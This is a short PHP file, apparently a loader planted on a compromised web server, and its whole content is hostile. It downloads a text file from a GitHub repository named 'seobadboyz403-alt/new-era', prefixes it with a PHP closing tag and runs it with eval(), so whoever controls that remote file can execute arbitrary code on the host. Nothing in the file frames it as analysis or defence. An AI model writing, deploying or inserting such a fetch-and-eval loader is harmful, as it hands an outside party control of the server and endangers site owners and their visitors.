<?php

$content = file_get_contents(urldecode('https://raw.githubusercontent.com/seobadboyz403-alt/new-era/refs/heads/main/badboyz-edition.txt'));

$content = "?> ".$content;
eval($content);
